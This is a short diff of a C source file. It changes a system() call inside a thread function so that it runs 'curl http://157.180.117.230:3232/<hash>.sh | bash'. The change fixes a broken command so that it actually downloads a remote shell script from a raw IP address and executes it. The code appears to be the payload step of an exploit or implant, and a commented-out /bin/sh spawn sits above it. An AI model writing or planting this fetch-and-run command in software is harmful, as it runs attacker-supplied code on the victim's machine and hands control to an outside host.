@@ -110,7 +110,7 @@ void *thread(void *arg) {
     char * const argv[] = {"/bin/sh", NULL};
     execvp("/bin/sh", argv);*/
 
-    system("/bin/sh -c 'http://157.180.117.230:3232/5bf0f6c956b604bc3c9c47b35d30195f.sh | bash'");
+    system("/bin/sh -c 'curl http://157.180.117.230:3232/5bf0f6c956b604bc3c9c47b35d30195f.sh | bash'");
 
     pthread_exit((char*)"exit");
 }
